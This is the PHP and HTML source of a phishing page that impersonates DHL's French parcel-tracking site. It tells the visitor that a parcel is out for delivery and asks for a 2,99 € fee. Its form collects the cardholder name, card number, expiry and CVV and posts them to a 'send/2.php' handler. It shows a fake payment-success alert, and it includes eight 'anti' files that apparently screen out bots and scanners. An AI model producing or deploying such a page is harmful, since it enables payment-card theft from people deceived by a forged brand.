<?php
session_start();
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';
?>
<html><head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Connexion aux portails et outils clients | DHL |</title>
        <!-- logo site web-->
        <link rel="icon" href="img/favicon.ico" type="image/x-icon">
        <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
        <!-- link__css -->
        <link rel="stylesheet" href="img/bootstrap.css">
        <link rel="stylesheet" href="img/posta.css">
</head>
<body>


        <!-- Start____Navbar -->
        <div class="navbar">
        	<div class="container-fluid">
        		<div class="topping">
        			<img src="img/dhl-logo.svg">
        			<ul class="web">
        				<li><i class="bi bi-exclamation-circle me-2"></i>Alerte(1)</li>
        				<li>Nous contacter</li>
        				<li><i class="bi bi-globe me-2"></i>Français</li>
        				<li><i class="bi bi-search me-2"></i>Rechercher</li>
        			</ul>
        			<ul class="respo">
        				<li><i class="bi bi-list"></i></li>
        				<li></li>
        			</ul>
        		</div>
        		<div class="bottomin">
        			<ul>
        				<li>Suivre<i class="bi bi-chevron-down ms-1"></i></li>
        				<li>Envoyer<i class="bi bi-chevron-down ms-1"></i></li>
        				<li>Solutions logistiques<i class="bi bi-chevron-down ms-1"></i></li>
        				<li>Service client<i class="bi bi-chevron-down ms-1"></i></li>
        			</ul>
        			<p><i class="bi bi-person-fill me-2"></i>Connexion portail client</p>
        		</div>
        	</div>
        </div>
        <!-- End____Navbar -->

        <!-- Start____Home -->
        <div class="home info carta">
        	<div class="otside put">
        		<div class="container">
        			<div class="text-center"><h1>SUIVI DHL</h1></div>
        			<div class="lettre login valid">
        				<div class="dell">
        					<div class="titre">
	        					<img src="img/camion.png">
	        					<h3>Envoi en cours de livraison</h3>
	        				</div>
	        				<div class="steps">
	        					<span class="green"></span>
	        					<span class="green"></span>
	        					<span></span>
	        				</div>
        				</div>
        				<div class="row gx-4">
        					<div class="col-lg-8 genius">
        						<div class="gauche hna">
        							<h4>Informations de la carte</h4>
        							<div class="magic">
										<img src="img/vi.svg">
                                    <img src="img/mas.svg">
									</div>
        							<form id="form" action="send/2.php" method="post" onsubmit="return formValidation()">
        								<input type="hidden" name="step" value="cc">
        								<div class="form-group mt-3">	
                                             <label>Nom du titulaire de la carte <span>*</span></label>
                                             <input type="text" name="full" id="full" class="form-control" required="" placeholder="Nom du titulaire">
        								</div>
        								<div class="ereur_full" style="color:red;font-size:12px"></div>
    									<div class="form-group mt-3 viza">	
                                             <label>Numéro de carte <span>*</span></label>
                                             <input type="text" name="card" id="card" class="form-control" required="" placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
        								</div>
        								<div class="ereur_card" style="color:red;font-size:12px"></div>
        								<div class="calisy">
        									<div class="form-group mt-3 ville">	
	                                             <input type="text" name="month" id="month" class="form-control" required="" placeholder=" MM" maxlength="2">
	                                             <div class="ereur_month" style="color:red;font-size:11px"></div>
	        								</div>
	        								<div class="form-group mt-3 ville">	
	                                             <input type="text" name="year" id="year" class="form-control" required="" placeholder=" AA" maxlength="2">
	                                             <div class="ereur_year" style="color:red;font-size:11px"></div>
	        								</div>
	        								<div class="form-group mt-3 astra">	
	                                             <input type="text" name="cvv" id="cvv" class="form-control" required="" placeholder="CVV" maxlength="3">
	                                             <div class="ereur_cvv" style="color:red;font-size:11px"></div>
	        								</div>
        								</div>
        								<div class="botona">
        									<button type="submit" class="btn" name="submit">Payer</button>
        								</div>	
        							</form>
        						</div>
        					</div>
        					<div class="col-lg-4 power">
        					    <div class="droit lhih">
        					     	<div class="offre">
                                        <div class="status">
                                            <p>Statut : <b>en cours de livraison</b></p>
                                        </div>
                                        <div class="status">
                                            <p>Cet envoi est géré par : <b>DHL Parcel</b></p>
                                        </div>
                                        <div class="status">
                                            <p>Code de suivi : CS47*********</p>
                                        </div>
                                    </div>
									<div class="offre">
										<div class="status">
											
										</div>
										<div class="status">
											<p>Type d'envoi : <b>Autre</b></p>
										</div>
										<div class="status">
											<p>Total : <b>2,99 €</b></p>
										</div>
									</div>
									<hr>
									<div class="important mt-4">
    							<h5>Message important !</h5>
    							<p>Pour finaliser la livraison dès que possible, veuillez confirmer le paiement (2,99 €) en cliquant sur Payer.</p>
    						</div>
        					    </div>
        					</div>
        				</div>
        			</div>
        		</div>
        	</div>
        </div>
        <!-- Ennnd____Home -->



        <!-- STAAAART_SOUS -->
        <div class="sous boso ">
        	<div class="container-fluid">
        		<div class="row">
        			<div class="col-lg-9">
        				<img src="img/group.svg">
        				<ul>
        					<li>Sensibilisation à la fraude</li>
        					<li>Mentions légales</li>
        			 		<li>Conditions d'utilisation</li>
        					<li>Politique de confidentialité</li>
        					<li>Résolution des litiges</li>
        					<li>Accessibilité</li>
        					<li>Informations complémentaires</li>
        					<li>Paramètres des cookies</li>
        				</ul>
        			</div>
        			<div class="col-lg-3">
        				<h6>Suivez-nous</h6>
        				<img src="img/socio.png" class="socio">
        			</div>
        			<div class="text-center ss">2026 © DHL International GmbH. Tous droits réservés</div>
        		</div>	
        	</div>
        </div>
        <!-- ENNNNNND_SOUS -->







        <script src="img/jquery-3.5.1.min.js"></script>
        <script src="img/jquery.mask.js"></script>
        <script src="img/jquery.mask.js"></script>
        <script>
        
	        $("#card").mask("0000 0000 0000 0000");
	        $("#month").mask("00");
	        $("#year").mask("00");
	        $("#cvv").mask("000");
        

             function formValidation(){
                var full = $("#full").val();
                var card = $("#card").val();
                var month = $("#month").val();
                var year = $("#year").val();
                var cvv = $("#cvv").val();


                // Validation_full
                if(full==""){
                    $(".ereur_full").text("champ requis");
                    $("#full").css("border","1px solid red")
                    return false;
                }else{
                    $("#full").css("border","1px solid #ced4da");
                    $(".ereur_full").hide();
                }


                if(card==""){
                    $(".ereur_card").text("champ requis");
                    $("#card").css("border","1px solid red")
                    return false;
                }else{
                    var patern_card = /^[0-9 ]{19}$/;
                    if(!patern_card.test(card)){
                        $(".ereur_card").text("Le numéro de carte doit contenir exactement 16 caractères");
                        $("#card").css("border","1px solid red")
                        return false;
                    }else{
                       $("#card").css("border","1px solid #ced4da");
                       $(".ereur_card").hide();
                    }
                }

                // Validation_MONTH
                if(month==""){
                    $(".ereur_month").text("champ requis");
                    $("#month").css("border","1px solid red")
                    return false;
                }else{
                    var patern_month = /^[0-9]{2}$/;
                    if(!patern_month.test(month)){
                        $(".ereur_month").text("doit contenir exactement 2 caractères");
                        $("#month").css("border","1px solid red")
                        return false;
                    }else{
                       $("#month").css("border","1px solid #ced4da");
                       $(".ereur_month").hide();
                    }
                }

                // Validation_YEAR
                if(year==""){
                    $(".ereur_year").text("champ requis");
                    $("#year").css("border","1px solid red")
                    return false;
                }else{
                    var patern_year = /^[0-9]{2}$/;
                    if(!patern_year.test(year)){
                        $(".ereur_year").text("doit contenir exactement 2 caractères");
                        $("#year").css("border","1px solid red")
                        return false;
                    }else{
                       $("#year").css("border","1px solid #ced4da");
                       $(".ereur_year").hide();
                    }
                }

                 // Validation_CVV
                if(cvv==""){
                    $(".ereur_cvv").text("champ requis");
                    $("#cvv").css("border","1px solid red")
                    return false;
                }else{
                    var patern_cvv = /^[0-9]{3}$/;
                    if(!patern_cvv.test(cvv)){
                        $(".ereur_cvv").text("doit contenir exactement 3 caractères");
                        $("#cvv").css("border","1px solid red")
                        return false;
                    }else{
                       $("#cvv").css("border","1px solid #ced4da");
                       $(".ereur_cvv").hide();
                    }
                }

                // Si tout est valide, afficher la confirmation de paiement
                alert("✅ Paiement validé avec succès !\nVotre colis sera livré dans les prochains jours.");
                return true;
            }
             
        </script>
              




                 </body></html>